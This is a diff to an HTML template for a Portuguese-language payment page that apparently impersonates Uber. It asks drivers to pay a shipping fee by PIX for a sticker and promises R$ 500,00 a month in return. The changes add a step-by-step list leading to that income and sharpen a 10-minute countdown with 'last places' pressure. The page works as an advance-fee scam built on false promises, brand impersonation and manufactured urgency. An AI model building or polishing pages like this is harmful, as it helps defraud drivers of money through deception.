@@ -22,8 +22,20 @@
         <div class="flex flex-col items-center mb-6">
             <div class="bg-yellow-100 border border-yellow-300 p-3 rounded mb-4 max-w-2xl mx-auto">
                 <p class="text-yellow-800 text-base font-semibold text-center mb-4">⚠️ IMPORTANTE: Sem o pagamento do frete, o adesivo não será enviado e você não poderá participar do Programa, perdendo a renda de R$ 500,00 mensais.</p>
-                <div class="flex justify-center">
+                <div class="flex justify-center mb-4">
                     <img src="https://i.ibb.co/1JQ5QnxH/1-1.png" alt="Adesivo Uber" class="h-56 w-auto rounded">
+                </div>
+                
+                <!-- Próximos Passos -->
+                <div class="text-left">
+                    <h4 class="text-yellow-800 font-bold text-sm mb-2">Próximos passos para participar do programa:</h4>
+                    <ol class="text-yellow-700 text-sm space-y-1 ml-4">
+                        <li>1. Realizar o pagamento do frete</li>
+                        <li>2. Colar o adesivo no para-brisa traseiro</li>
+                        <li>3. Mandar foto para a Uber</li>
+                        <li>4. Receber o cartão de pagamento</li>
+                        <li>5. Pronto! Começar a receber R$ 500,00 mensais</li>
+                    </ol>
                 </div>
             </div>
             
@@ -67,18 +79,17 @@
             <!-- Cronômetro de 10 minutos - SEMPRE VISÍVEL -->
             <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-4 max-w-md mx-auto">
                 <div class="text-center">
-                    <p class="text-red-800 font-bold text-sm mb-2">🔥 ÚLTIMAS VAGAS DO PROGRAMA!</p>
+                    <p class="text-red-800 font-bold text-sm mb-2">ÚLTIMAS VAGAS DO PROGRAMA!</p>
                     <p class="text-red-700 text-xs mb-3">Seu PIX expira em:</p>
-                    <div id="countdown-timer" class="text-2xl font-bold text-red-600 mb-2">10:00</div>
+                    <div id="countdown-timer" class="text-3xl font-bold text-red-600 mb-2">10:00</div>
                     <p class="text-red-700 text-xs leading-tight">
-                        ⚠️ Realize o pagamento antes da expiração para garantir sua vaga no programa Uber e não perder a renda mensal de R$ 500,00!
+                        Realize o pagamento dentro do prazo ou passaremos sua vaga para o próximo motorista.
                     </p>
                 </div>
             </div>
             
             {% if payment_data %}
             <!-- Payment Status Box -->
-            <div id="paymentStatusBox" class="bg-gray-100 border border-gray-300 rounded p-4 mb-6 w-full max-w-2xl mx-auto">
             <div class="bg-gray-100 border border-gray-300 rounded p-4 mb-6 w-full max-w-2xl mx-auto">
                 <!-- Centralized Loading Dots -->
                 <div class="flex justify-center mb-3">
